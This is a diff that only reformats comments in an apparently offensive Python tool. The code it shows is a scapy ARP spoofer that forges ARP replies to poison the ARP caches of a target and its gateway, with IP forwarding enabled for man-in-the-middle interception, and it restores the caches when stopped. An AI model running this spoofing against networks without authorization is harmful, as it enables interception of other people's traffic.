@@ -12,19 +12,19 @@ def enable_ip_route();
 
 def ScapyArpSpoofer(target, host, timing, verbose):
 
-    #creating and sending an arp packet that modifies the arp table of both target and gateway  
+    # Creating and sending an arp packet that modifies the arp table of both target and gateway.
     def spoofer(destination, source, mac_address):
         packet = scapy.ARP(op=2, pdst=destination, hwdst=mac_address, psrc=source)
         scapy.send(packet, verbose=False)
 
 
-    #creating and sending an arp packet that restores the arp tables values
+    # Creating and sending an arp packet that restores the arp tables values.
     def restore_cache(destination, source, dest_mac, source_mac):
         packet = scapy.ARP(op=2, pdst=destination, hwdst=dest_mac, psrc=source, hwsrc=source_mac)
         scapy.send(packet, verbose=False)
 
 
-    #if the host is not given, gets the default gateway
+    # If the host is not given, gets the default gateway.
     if not host:
         host = info.get_default_gateway()
         print(f"[bold green][+][/bold green] Your default gateway is {host}.")
@@ -48,7 +48,7 @@ def ScapyArpSpoofer(target, host, timing, verbose):
 
             time.sleep(timing)
     
-    #restoring cache before interrupting the script
+    # Restoring cache before interrupting the script.
     except KeyboardInterrupt:
         print("\n[bold yellow][-][/bold yellow] Restoring cache[white]...[/white]")
         restore_cache(target, host, target_mac, host_mac)
